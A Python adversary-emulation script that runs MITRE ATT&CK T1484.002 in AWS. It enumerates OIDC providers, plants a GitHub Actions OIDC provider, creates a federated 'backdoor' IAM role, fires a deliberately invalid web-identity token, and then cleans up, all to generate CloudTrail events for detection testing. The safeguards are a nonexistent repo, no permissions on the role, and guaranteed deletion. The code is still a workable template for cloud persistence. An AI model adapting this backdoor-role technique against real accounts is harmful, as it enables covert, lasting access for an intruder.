# FILE: attack.py
"""
ATOMIC_IAM_OIDC_PROVIDER_BACKD - Automated Attack Script
OIDC Provider Trust Modification - Backdoor Federated Role (T1484.002)

Entry point: run(outputs, region)

Phases:
  1. Enumeration  - GetCallerIdentity + ListOpenIDConnectProviders
  2. Plant        - CreateOpenIDConnectProvider (or piggyback existing)
  3. Persistence  - CreateRole with federated OIDC trust (no permissions attached)
  4. Trigger      - AssumeRoleWithWebIdentity with invalid JWT (expected failure)
  5. Cleanup      - DeleteRole + conditional DeleteOpenIDConnectProvider (finally block)
"""
import sys
import time
import random
import json
import pathlib

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError

# ── Resource names: single source of truth ──────────────────────────────────
# attack.py lives at emulation_output/<HASH>/attack.py; infra/ is three levels up.
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key) or default


def _p(outputs, semantic_key, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> outputs dict -> default."""
    export_key = _PKS.get(semantic_key, semantic_key)
    return outputs.get(export_key) or default


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


# Dummy JWT: valid header+claims structure, cryptographically invalid signature.
# sub matches the backdoor role's StringLike condition so STS evaluates the claim
# set before rejecting on signature - generates a richer CloudTrail error event.
_DUMMY_JWT = (
    "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJzdWIiOiJyZXBvOm9yZy1kb2VzLW5vdC1leGlzdC9yZXBvLWRvZXMtbm90LWV4aXN0OnJlZjpy"
    "ZWZzL2hlYWRzL21haW4iLCJhdWQiOiJzdHMuYW1hem9uYXdzLmNvbSIsImlzcyI6Imh0dHBzOi8vd"
    "G9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb20ifQ"
    ".INVALID_SIGNATURE"
)

# Runtime-created attack artifact name - NOT a Pulumi logical name
_BACKDOOR_ROLE_NAME = "backdoor-oidc-federated-role"

# Known constants - not infra-managed, safe to hardcode
_GITHUB_OIDC_URL        = "https://token.actions.githubusercontent.com"
_GITHUB_OIDC_THUMBPRINT = "6938fd4d98bab03faadb97b34396831e3780aea1"


def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Resolve dynamic values from Pulumi outputs ───────────────────────────
    _set_tenant_credentials(outputs)

    exec_role_arn = _p(outputs, "exec_role_arn")
    if not exec_role_arn:
        raise RuntimeError("Missing required output: exec_role_arn")

    # Infra may export the bait provider ARN if Pulumi created it.
    # Enumeration still runs to generate the CloudTrail event regardless.
    infra_github_provider_arn = _p(outputs, "github_provider_arn")

    # Build exec-role session - single session reused for all API calls
    exec_session = None
    for _ in range(10):  # IAM propagation retry
        try:
            _c = _base_session(region).client("sts").assume_role(
                RoleArn=exec_role_arn, RoleSessionName="atomic-exec")["Credentials"]
            exec_session = boto3.Session(
                aws_access_key_id=_c["AccessKeyId"], aws_secret_access_key=_c["SecretAccessKey"],
                aws_session_token=_c["SessionToken"], region_name=region)
            break
        except ClientError:
            time.sleep(3)
    if exec_session is None:
        raise RuntimeError(f"Could not assume {exec_role_arn}")

    sts = exec_session.client("sts", region_name=region)
    iam = exec_session.client("iam", region_name=region)

    # ── Phase 1: Enumeration (read-only; no cleanup needed) ─────────────────
    print_step("Phase 1 - Enumeration (T1484.002)")
    print_step("Step 1a: GetCallerIdentity - confirm exec-role session is live")

    try:
        identity = sts.get_caller_identity()
        account_id = identity["Account"]
        exec_arn   = identity["Arn"]
        print_ok(f"GetCallerIdentity: account={account_id} arn={exec_arn}")
    except ClientError as e:
        raise RuntimeError(f"GetCallerIdentity failed: {e}") from e

    op_delay(2, 4)

    print_step("Step 1b: ListOpenIDConnectProviders - enumerate existing IdPs")

    try:
        list_resp = iam.list_open_id_connect_providers()
    except ClientError as e:
        raise RuntimeError(f"ListOpenIDConnectProviders failed: {e}") from e

    existing_providers = list_resp.get("OpenIDConnectProviderList", [])
    print_ok(f"Found {len(existing_providers)} existing OIDC provider(s):")
    for p in existing_providers:
        print_ok(f"  {p['Arn']}")

    # Resolve the pre-existing GitHub OIDC provider ARN, if any.
    # Prefer the infra-exported ARN (avoids GetOpenIDConnectProvider round-trips);
    # fall back to detail-fetching each provider to match by URL.
    existing_github_arn = None

    if infra_github_provider_arn:
        existing_github_arn = infra_github_provider_arn
        print_ok(f"GitHub OIDC provider from stack outputs: {existing_github_arn}")
    else:
        for p in existing_providers:
            arn = p["Arn"]
            try:
                detail = iam.get_open_id_connect_provider(OpenIDConnectProviderArn=arn)
                if detail.get("Url", "").rstrip("/") == _GITHUB_OIDC_URL.rstrip("/"):
                    existing_github_arn = arn
                    print_ok(f"GitHub OIDC provider found via detail lookup: {arn}")
                    break
            except ClientError as e:
                print_err(f"GetOpenIDConnectProvider {arn} skipped: {e}")

    op_delay(2, 4)
    phase_delay()

    # ── Attack state: tracks what the script created for scoped cleanup ──────
    provider_created_by_attack = False
    oidc_provider_arn  = existing_github_arn   # may be None; resolved definitively in step 2
    backdoor_role_arn  = None

    # ── All mutating steps are inside this try/finally ───────────────────────
    # The finally block runs unconditionally (success, partial failure, or exception)
    # and removes only resources the attack itself created.
    try:
        # ── Phase 2: Plant OIDC Provider ─────────────────────────────────────
        print_step("Phase 2 - Create Backdoor OIDC Provider (T1484.002)")
        print_step(
            "Step 2: CreateOpenIDConnectProvider for token.actions.githubusercontent.com"
        )

        if existing_github_arn:
            # Piggyback on the pre-existing provider - no create call needed.
            # This is the expected path when the bait provider was pre-deployed by Pulumi.
            oidc_provider_arn = existing_github_arn
            provider_created_by_attack = False
            print_ok(
                f"GitHub OIDC provider already present at {existing_github_arn} - "
                "piggybacking as trust anchor (provider_created_by_attack=False)"
            )
        else:
            try:
                create_resp = iam.create_open_id_connect_provider(
                    Url=_GITHUB_OIDC_URL,
                    ClientIDList=["sts.amazonaws.com"],
                    ThumbprintList=[_GITHUB_OIDC_THUMBPRINT],
                )
                oidc_provider_arn = create_resp["OpenIDConnectProviderArn"]
                provider_created_by_attack = True
                print_ok(
                    f"CreateOpenIDConnectProvider succeeded: {oidc_provider_arn} "
                    "(provider_created_by_attack=True)"
                )
            except ClientError as e:
                err_code = e.response.get("Error", {}).get("Code", "")
                if err_code == "EntityAlreadyExists":
                    # Race: provider appeared between list and create; re-scan for ARN.
                    print_ok(
                        "EntityAlreadyExists - provider appeared since last list; "
                        "re-fetching ARN"
                    )
                    try:
                        rescan = iam.list_open_id_connect_providers()
                        for p in rescan.get("OpenIDConnectProviderList", []):
                            arn = p["Arn"]
                            try:
                                detail = iam.get_open_id_connect_provider(
                                    OpenIDConnectProviderArn=arn
                                )
                                if (
                                    detail.get("Url", "").rstrip("/")
                                    == _GITHUB_OIDC_URL.rstrip("/")
                                ):
                                    oidc_provider_arn = arn
                                    break
                            except ClientError:
                                continue
                    except ClientError as re_err:
                        raise RuntimeError(
                            f"Re-scan after EntityAlreadyExists failed: {re_err}"
                        ) from re_err

                    if not oidc_provider_arn:
                        raise RuntimeError(
                            "EntityAlreadyExists but could not locate the "
                            "pre-existing provider ARN"
                        )
                    provider_created_by_attack = False
                    print_ok(
                        f"Using pre-existing provider {oidc_provider_arn} "
                        "(provider_created_by_attack=False)"
                    )
                else:
                    raise RuntimeError(
                        f"CreateOpenIDConnectProvider failed: {e}"
                    ) from e

        if not oidc_provider_arn:
            raise RuntimeError(
                "No OIDC provider ARN available - cannot build backdoor trust policy"
            )

        op_delay(2, 5)
        phase_delay()

        # ── Phase 3: Persistence - Create Backdoor Federated Role ────────────
        # Trust policy references the resolved provider ARN; sub condition scoped to
        # a non-existent repository so the role has zero real-world blast radius.
        # No permissions policy is attached. The Federated principal in the trust
        # policy is the primary CloudTrail detection signal (T1484.002).
        print_step("Phase 3 - Persistence: Create Backdoor Federated Role (T1484.002)")
        print_step(
            f"Step 3: CreateRole {_BACKDOOR_ROLE_NAME} with OIDC federated trust "
            f"-> {oidc_provider_arn}"
        )

        trust_policy = json.dumps({
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {"Federated": oidc_provider_arn},
                    "Action": "sts:AssumeRoleWithWebIdentity",
                    "Condition": {
                        "StringLike": {
                            "token.actions.githubusercontent.com:sub":
                                "repo:org-does-not-exist/repo-does-not-exist:*"
                        }
                    },
                }
            ],
        })

        try:
            role_resp = iam.create_role(
                RoleName=_BACKDOOR_ROLE_NAME,
                AssumeRolePolicyDocument=trust_policy,
                Description="Backdoor federated role - emulation artifact",
            )
            backdoor_role_arn = role_resp["Role"]["Arn"]
            print_ok(
                f"CreateRole succeeded: {backdoor_role_arn} - "
                f"Federated={oidc_provider_arn} (no permissions attached)"
            )
        except ClientError as e:
            raise RuntimeError(f"CreateRole failed: {e}") from e

        op_delay(2, 5)
        phase_delay()

        # ── Phase 4: Trigger - AssumeRoleWithWebIdentity (expected failure) ──
        # Invalid JWT guarantees InvalidIdentityToken. The STS call still lands
        # in CloudTrail with an errorCode, exercising the detection pipeline for
        # failed OIDC federation attempts against a newly-created backdoor role.
        print_step(
            "Phase 4 - Trigger: AssumeRoleWithWebIdentity with invalid JWT (T1484.002)"
        )
        print_step(
            f"Step 4: AssumeRoleWithWebIdentity -> {backdoor_role_arn} "
            "(expected: InvalidIdentityToken)"
        )

        try:
            sts.assume_role_with_web_identity(
                RoleArn=backdoor_role_arn,
                RoleSessionName="backdoor-oidc-test",
                WebIdentityToken=_DUMMY_JWT,
            )
            # Should be unreachable with a dummy JWT; flag it if AWS ever accepts it.
            print_err(
                "WARNING: AssumeRoleWithWebIdentity unexpectedly succeeded - "
                "emulation produced live credentials; NOT using them"
            )
        except ClientError as e:
            err_code = e.response.get("Error", {}).get("Code", "")
            if err_code == "InvalidIdentityToken":
                print_ok(
                    f"AssumeRoleWithWebIdentity returned {err_code} (expected) - "
                    f"CloudTrail error-code event generated for {_BACKDOOR_ROLE_NAME}"
                )
            else:
                # Any other STS error (ExpiredTokenException, AccessDenied, etc.)
                # still produces a CloudTrail event - treat as non-fatal.
                print_ok(
                    f"AssumeRoleWithWebIdentity returned {err_code} - "
                    f"CloudTrail event generated for {_BACKDOOR_ROLE_NAME}"
                )

        op_delay(2, 4)

    finally:
        # ── Phase 5: Cleanup ─────────────────────────────────────────────────
        # Runs unconditionally: success, mid-chain failure, or exception.
        # Guards on backdoor_role_arn and provider_created_by_attack ensure only
        # attack-created resources are removed; pre-existing infra is left intact.
        print_step(
            "Phase 5 - Cleanup: Delete Backdoor Role + "
            "Conditional Delete OIDC Provider"
        )

        # Step 5: DeleteRole - only if the role was successfully created
        if backdoor_role_arn is not None:
            print_step(f"Step 5: DeleteRole -> {_BACKDOOR_ROLE_NAME}")
            try:
                iam.delete_role(RoleName=_BACKDOOR_ROLE_NAME)
                print_ok(f"DeleteRole succeeded: {_BACKDOOR_ROLE_NAME} removed")
            except ClientError as e:
                err_code = e.response.get("Error", {}).get("Code", "")
                if err_code in ("NoSuchEntityException", "NoSuchEntity"):
                    print_err(
                        f"DeleteRole: {_BACKDOOR_ROLE_NAME} not found "
                        "(already deleted or never committed)"
                    )
                else:
                    print_err(f"DeleteRole failed (non-fatal, continuing cleanup): {e}")
            op_delay(1, 3)
        else:
            print_step("Step 5: Skipping DeleteRole - role was never created")

        # Step 6: DeleteOpenIDConnectProvider - ONLY if the attack created it.
        # Pre-existing providers (provider_created_by_attack=False) must not be touched.
        if provider_created_by_attack and oidc_provider_arn:
            print_step(
                f"Step 6: DeleteOpenIDConnectProvider -> {oidc_provider_arn} "
                "(attack-created - removing)"
            )
            try:
                iam.delete_open_id_connect_provider(
                    OpenIDConnectProviderArn=oidc_provider_arn
                )
                print_ok(
                    "DeleteOpenIDConnectProvider succeeded: "
                    "token.actions.githubusercontent.com provider removed"
                )
            except ClientError as e:
                err_code = e.response.get("Error", {}).get("Code", "")
                if err_code in ("NoSuchEntityException", "NoSuchEntity"):
                    print_err(
                        "DeleteOpenIDConnectProvider: provider not found "
                        "(already deleted or never committed)"
                    )
                else:
                    print_err(
                        f"DeleteOpenIDConnectProvider failed (non-fatal): {e}"
                    )
            op_delay(1, 3)
        elif not provider_created_by_attack and oidc_provider_arn:
            print_step(
                f"Step 6: Skipping DeleteOpenIDConnectProvider - "
                f"{oidc_provider_arn} was pre-existing; leaving untouched"
            )
        else:
            print_step(
                "Step 6: Skipping DeleteOpenIDConnectProvider - "
                "no attack-created provider to remove"
            )

    # ── Execution Summary ─────────────────────────────────────────────────────
    print("\n" + "=" * 65)
    print("ATOMIC_IAM_OIDC_PROVIDER_BACKD - Execution Summary")
    print("=" * 65)
    print("MITRE ATT&CK: T1484.002 (Trust Modification - OIDC Provider)")
    print("Tactics     : Defense Evasion, Privilege Escalation")
    print("")
    print("CloudTrail events generated:")
    print("  Phase 1 - Enumeration:")
    print("    [sts] GetCallerIdentity")
    print("    [iam] ListOpenIDConnectProviders")
    if not infra_github_provider_arn:
        print("    [iam] GetOpenIDConnectProvider (per-provider URL detail fetch)")
    print("  Phase 2 - OIDC Provider:")
    if provider_created_by_attack:
        print("    [iam] CreateOpenIDConnectProvider (attack-created)")
    else:
        print("    [iam] (no create - piggybacked on pre-existing provider)")
    print("  Phase 3 - Persistence:")
    print(f"    [iam] CreateRole: {_BACKDOOR_ROLE_NAME} (Federated OIDC trust)")
    print("  Phase 4 - Trigger:")
    print(
        f"    [sts] AssumeRoleWithWebIdentity: {_BACKDOOR_ROLE_NAME} "
        "(error: InvalidIdentityToken)"
    )
    print("  Phase 5 - Cleanup:")
    if backdoor_role_arn:
        print(f"    [iam] DeleteRole: {_BACKDOOR_ROLE_NAME}")
    if provider_created_by_attack and oidc_provider_arn:
        print(f"    [iam] DeleteOpenIDConnectProvider: {oidc_provider_arn}")
    print("=" * 65)
